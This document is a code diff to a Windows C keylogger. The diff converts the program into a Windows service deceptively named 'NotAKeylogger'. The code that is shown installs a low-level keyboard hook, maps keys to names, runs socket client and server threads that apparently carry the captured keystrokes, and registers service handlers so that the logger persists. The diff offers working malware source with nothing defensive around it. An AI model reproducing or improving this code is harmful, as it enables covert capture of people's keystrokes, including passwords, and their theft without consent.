@@ -3,6 +3,8 @@
 ///static HINSTANCE hinst;
 static HHOOK handlekeyboard = NULL;
 SOCKET my_sock = INVALID_SOCKET;
+SERVICE_STATUS service_status;
+SERVICE_STATUS_HANDLE hstatus;
 const struct keyboard keyboard[] =
 {
 	{ VK_BACK, "[BACK]" },
@@ -111,6 +113,51 @@ const struct keyboard keyboard[] =
 	{ 0, "[UNKNOWN]" }
 };
 
+int		WriteToLog(char *str)
+{
+	FILE *log;
+
+	if (_wfopen_s(&log, LOGFILE, L"a+") != 0)
+		return (-1);
+	fprintf(log, "%s\n", str);
+	fclose(log);
+	return (0);
+}
+
+void	StopStruct(void)
+{
+	service_status.dwWin32ExitCode = 0;
+	service_status.dwCurrentState = SERVICE_STOPPED;
+	SetServiceStatus(hstatus, &service_status);
+}
+
+void	ControlHandler(DWORD request)
+{
+	switch (request)
+	{
+	case SERVICE_CONTROL_STOP:
+		StopStruct();
+		return;
+	case SERVICE_CONTROL_SHUTDOWN:
+		StopStruct();
+		return;
+	default:
+		break;
+	}
+	SetServiceStatus(hstatus, &service_status);
+}
+
+void	InitStruct(void)
+{
+	service_status.dwServiceType = SERVICE_WIN32;
+	service_status.dwCurrentState = SERVICE_START_PENDING;
+	service_status.dwControlsAccepted = SERVICE_ACCEPT_STOP | SERVICE_ACCEPT_SHUTDOWN;
+	service_status.dwWin32ExitCode = 0;
+	service_status.dwServiceSpecificExitCode = 0;
+	service_status.dwCheckPoint = 0;
+	service_status.dwWaitHint = 0;
+	hstatus = RegisterServiceCtrlHandler(L"NotAKeylogger", (LPHANDLER_FUNCTION)ControlHandler);
+}
 LRESULT CALLBACK LowLevelKeyboardProc(int nCode, WPARAM wparam, LPARAM lparam)
 {
 	LPKBDLLHOOKSTRUCT kb;
@@ -218,39 +265,58 @@ void keep_alive_client_and_init(void)
 	}
 	return;
 }
-
-int	main(void)
+int	ServiceMain(void)
 {
 	MSG msg;
-	WSADATA wsadata;
 	HANDLE thread_keepalive;
 	HANDLE thread_server;
 	SOCKET server_sock;
 
-	WSAStartup(MAKEWORD(2, 0), &wsadata);
-	if ((thread_keepalive = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)keep_alive_client_and_init, NULL, 0, NULL)) == NULL)
-		return (-1);
-	if ((thread_server = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)server, &server_sock, 0, NULL)) == NULL)
-		return (-1);
-	setwinhook();
-	while (GetMessage(&msg, NULL, 0, 0))
+	InitStruct();
+	service_status.dwCurrentState = SERVICE_RUNNING;
+	if (service_status.dwCurrentState == SERVICE_RUNNING)
+		WriteToLog("currentstateok");
+	SetServiceStatus(hstatus, &service_status);
+	if (service_status.dwCurrentState == SERVICE_RUNNING)
 	{
-		if (PeekMessage(&msg, NULL, WM_CLOSE, WM_CLOSE, PM_NOREMOVE) == TRUE)
+		if ((thread_keepalive = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)keep_alive_client_and_init, NULL, 0, NULL)) == NULL)
+			return (-1);
+		if ((thread_server = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)server, &server_sock, 0, NULL)) == NULL)
+			return (-1);
+		setwinhook();
+		while (GetMessage(&msg, NULL, 0, 0))
 		{
-			break;
+			if (PeekMessage(&msg, NULL, WM_CLOSE, WM_CLOSE, PM_NOREMOVE) == TRUE)
+			{
+				break;
+			}
+			TranslateMessage(&msg);
+			DispatchMessage(&msg);
 		}
-		TranslateMessage(&msg);
-		DispatchMessage(&msg);
-	}
-	UnhookWindowsHookEx(handlekeyboard);
-	if (shutdown(my_sock, SD_BOTH) == SOCKET_ERROR)
-	{
-		printf("failed shutdown\n");
+		UnhookWindowsHookEx(handlekeyboard);
+		if (shutdown(my_sock, SD_BOTH) == SOCKET_ERROR)
+		{
+			printf("failed shutdown\n");
+			closesocket(my_sock);
+			return (-1);
+		}
 		closesocket(my_sock);
-		return (-1);
+		TerminateThread(thread_keepalive, 0);
 	}
-	closesocket(my_sock);
-	TerminateThread(thread_keepalive, 0);
+	return (0);
+}
+int	main(void)
+{
+	WSADATA wsadata;
+
+	SERVICE_TABLE_ENTRY service_table[2];
+
+	WSAStartup(MAKEWORD(2, 0), &wsadata);
+	service_table[0].lpServiceName = L"NotAKeylogger";
+	service_table[0].lpServiceProc = (LPSERVICE_MAIN_FUNCTION)ServiceMain;
+	service_table[1].lpServiceName = NULL;
+	service_table[1].lpServiceProc = NULL;
+	StartServiceCtrlDispatcher(service_table);
 	WSACleanup();
-	return (msg.wParam);
+	return (0);
 }
